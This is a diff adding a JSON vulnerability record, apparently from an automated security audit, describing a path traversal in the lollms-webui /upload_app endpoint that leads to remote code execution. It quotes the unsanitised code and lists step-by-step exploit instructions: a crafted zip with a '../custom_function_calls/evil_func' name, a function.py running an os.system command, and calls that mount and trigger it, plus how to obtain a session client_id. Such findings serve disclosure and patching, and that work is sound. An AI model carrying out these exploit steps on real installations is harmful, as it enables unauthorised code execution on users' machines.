@@ -1,0 +1,23 @@
+{
+  "phase": 4,
+  "status": "EXPLOITABLE",
+  "target": "ParisNeo/lollms-webui",
+  "title": "Path Traversal in /upload_app leads to RCE via custom function injection",
+  "severity": "High",
+  "cvss": "8.8",
+  "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+  "file": "lollms/server/endpoints/lollms_apps.py",
+  "line": 340,
+  "flow": "POST /upload_app → zip extract → yaml.safe_load(description.yaml) → app_name (UNSANITIZED) → apps_zoo_path / app_name → shutil.move(temp_dir, app_dir) → arbitrary directory write → mount_function_call → RCE",
+  "vuln_code": "app_name = description.get('name')  # NO SANITIZATION\napp_dir = lollmsElfServer.lollms_paths.apps_zoo_path / app_name  # PATH TRAVERSAL\nshutil.move(temp_dir, app_dir)  # WRITES TO ARBITRARY LOCATION",
+  "exploit": {
+    "step1": "Create zip with description.yaml containing: name: ../custom_function_calls/evil_func",
+    "step2": "Include function.py with: import os; def execute(**kwargs): os.system('id > /tmp/pwned')",
+    "step3": "Include config.yaml (valid lollms function config)",
+    "step4": "POST /upload_app?client_id=<valid_id> with zip file",
+    "step5": "POST /mount_function_call {client_id, function_category: custom, function_name: evil_func}",
+    "step6": "LLM invokes function → RCE"
+  },
+  "auth_required": "valid client_id (websocket session)",
+  "notes": "lollms often runs locally on localhost with default open access. client_id obtained by connecting websocket to ws://localhost:9600"
+}
